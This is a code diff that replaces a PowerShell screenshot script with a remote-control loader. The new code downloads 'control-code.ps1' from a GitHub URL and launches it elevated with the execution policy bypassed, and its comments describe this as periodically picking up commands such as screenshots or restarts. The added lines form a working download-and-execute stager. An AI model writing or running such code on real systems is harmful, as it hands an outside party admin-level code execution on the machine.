@@ -1,16 +1,20 @@
-# PowerShell script to take a screenshot and save it on the desktop
+# Define the GitHub URL for the code file
+$codeSource = "https://raw.githubusercontent.com/desimetr/ct/main/control-code.ps1"
 
-$desktopPath = [Environment]::GetFolderPath('Desktop')
-$screenshotPath = "$desktopPath\screen.jpeg"
+# Define the directory and local path to save the downloaded code
+$downloadDir = "C:\Users\WDAGUtilityAccount\Downloads"
+$localCodePath = "$downloadDir\control-code.ps1"
 
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
+# Check if the directory exists, if not, create it
+if (-Not (Test-Path -Path $downloadDir)) {
+    New-Item -ItemType Directory -Path $downloadDir
+}
 
-$screenshot = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-$graphics = [System.Drawing.Graphics]::FromImage($screenshot)
-$graphics.CopyFromScreen(0, 0, 0, 0, $screenshot.Size)
+# Download the script from GitHub
+Invoke-WebRequest -Uri $codeSource -OutFile $localCodePath
 
-$screenshot.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+# Execute the downloaded script (which could take a screenshot, restart, etc.)
+Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $localCodePath" -Verb RunAs
 
-$graphics.Dispose()
-$screenshot.Dispose()
+# Wait for a certain period (e.g., 5 minutes) before checking for updates again
+Start-Sleep -Seconds 300
